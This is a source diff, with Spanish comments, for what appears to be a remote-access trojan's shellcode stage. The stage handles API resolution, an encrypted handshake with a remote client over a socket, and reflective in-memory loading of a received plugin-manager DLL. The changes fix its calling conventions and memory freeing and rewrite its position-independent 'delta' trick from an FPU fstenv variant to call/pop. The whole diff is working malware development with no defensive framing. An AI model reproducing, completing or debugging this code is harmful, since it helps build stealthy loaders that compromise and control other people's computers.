@@ -291,7 +291,7 @@ void AddToModules(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module, LPCWSTR name){
     module->ldr_mod->InLoadOrderLinks.Flink = last;
 }
 
-int LoadLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, const void *data, LPCWSTR dllname, PMEMORYMODULE result){
+int __stdcall LoadLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, const void *data, LPCWSTR dllname, PMEMORYMODULE result){
 	PIMAGE_DOS_HEADER   dos_header;
 	PIMAGE_NT_HEADERS   old_header;
 	unsigned char       *code;
@@ -369,7 +369,7 @@ int LoadLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, const void *data, LPCWSTR dll
 	return 1;
 }
 
-void FreeLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
+void __stdcall FreeLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
     //Notificamos que vamos a descargar la libreria
     if (module->headers->OptionalHeader.AddressOfEntryPoint != 0){
         DllEntryProc DllEntry = (DllEntryProc)(module->codeBase + module->headers->OptionalHeader.AddressOfEntryPoint);
@@ -389,7 +389,7 @@ void FreeLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
     prev->Flink = next;
 
     //Liberamos la memoria
-    pSCC->VirtualFree_(module->codeBase, module->headers->OptionalHeader.SizeOfImage, MEM_RELEASE);
+    pSCC->VirtualFree_(module->codeBase, 0, MEM_RELEASE);
 
     //Liberamos cada DLL cargada
     for(int i=0; i<module->numModules;i++){
@@ -397,7 +397,7 @@ void FreeLibraryFromMemory(PSHELLCODE_CONTEXT pSCC, PMEMORYMODULE module){
     }
 
     //Liberamos el array de modules
-    pSCC->RtlFreeHeap_(pSCC->GetProcessHeap_, 0, module->modules);
+    pSCC->RtlFreeHeap_(pSCC->GetProcessHeap_(), 0, module->modules);
 }
 
 #pragma endregion
@@ -410,6 +410,17 @@ void Payload(PSHELLCODE_CONTEXT scc){
     //Generamos el OK
     char ok[16]     = {0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x1, 0x0};
     scc->CryptEncrypt_(scc->hKey, 0, true, 0, (BYTE*)ok, &dwDSize, sizeof(ok));
+
+    DWORD d=0;
+    __asm{
+        call get_delta
+get_delta:
+        pop  eax
+        sub  eax, get_delta
+        mov  [d], eax
+    }
+
+    scc->delta = d;
 
     //Enviamos el OK al cliente.
     if (scc->send_(scc->hSocket, ok, sizeof(ok), 0) == sizeof(ok)){
@@ -441,18 +452,11 @@ void Payload(PSHELLCODE_CONTEXT scc){
         }
         if (last_err == WSAENOTCONN){
             //TO DO: LEER PLUGINMANAGER ADHERIDO
-            DWORD delta = 0;
-            __asm{
-find_delta:     fldpi
-                __emit (0xD9); __emit (0x74); __emit (0x24); __emit (0xF4);    //fstenv (28-BYTE) PTR SS:[esp-0x0C]
-                pop  eax
-                sub  eax, find_delta
-                mov  [delta], eax
-            }
-            bBuff = (char*)(delta + ((PBYTE)main - (PBYTE)Start));
+            /*bBuff = (char*)(delta + ((PBYTE)main - (PBYTE)Start));
             dwDSize = *(DWORD*)(delta + ((PBYTE)main - (PBYTE)Start) - 4);
             dwSize = dwDSize;
             bReceived = true;
+            */
         }else{
             return;
         }
@@ -475,15 +479,15 @@ find_delta:     fldpi
         if (nChecksum == oChecksum){
             //Cargamos y ejecutamos el PluginManager
             WCHAR sDLLName[]    = {'p', 'm', '.', 'd', 'l', 'l', '\0'};
-            char sPMEntry[]     = {'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '1', '2', '\0'};
+            char sPMEntry[]     = {'I', 'n', 'i', 't', 'P', 'l', 'u', 'g', 'i', 'n', 'L', 'o', 'a', 'd','e', 'r', '@', '4', '\0'};
 
             PMEMORYMODULE PM_Mod = (PMEMORYMODULE)scc->RtlAllocateHeap_(scc->GetProcessHeap_(), 0, sizeof(MEMORYMODULE));;
             //Si hemos podido cargar el PM...
             if ((LoadLibraryFromMemory(scc, bBuff, sDLLName, PM_Mod))){
                 InitPluginLoader MainFunc = (InitPluginLoader)scc->GetProcAddressA_((HMODULE)PM_Mod->codeBase, sPMEntry);
                 if (MainFunc){
-                    scc->FLFM   = /*(FreeLibraryFromMemory_)*/((PBYTE)FreeLibraryFromMemory);
-                    scc->LLFM   = /*(LoadLibraryFromMemory_)*/((PBYTE)LoadLibraryFromMemory);
+                    scc->FLFM   = /*(FreeLibraryFromMemory_)*/((PBYTE)FreeLibraryFromMemory + scc->delta);
+                    scc->LLFM   = /*(LoadLibraryFromMemory_)*/((PBYTE)LoadLibraryFromMemory + scc->delta);
                     //y ejecutamos el Main
                     MainFunc(scc);
                 }
@@ -509,6 +513,7 @@ void scInit(_LoadLibraryA pLoadLibA, _GetProcAddress pGPA, SOCKET hSocket, HCRYP
     scc->memset_            = (_memset)pGPA(scc->NTDLL, smemset);
     scc->RtlAllocateHeap_   = (_RtlAllocateHeap)pGPA(scc->NTDLL, sRtlAllocateHeap);
     scc->RtlReAllocateHeap_ = (_RtlReAllocateHeap)pGPA(scc->NTDLL, sRtlReAllocateHeap);
+    scc->RtlFreeHeap_       = (_RtlFreeHeap)pGPA(scc->NTDLL, sRtlFreeHeap);
 
     scc->KERNEL32           = pLoadLibA(sKERNEL32);
     scc->FreeLibrary_       = (_FreeLibrary)pGPA(scc->KERNEL32, sFreeLibrary);
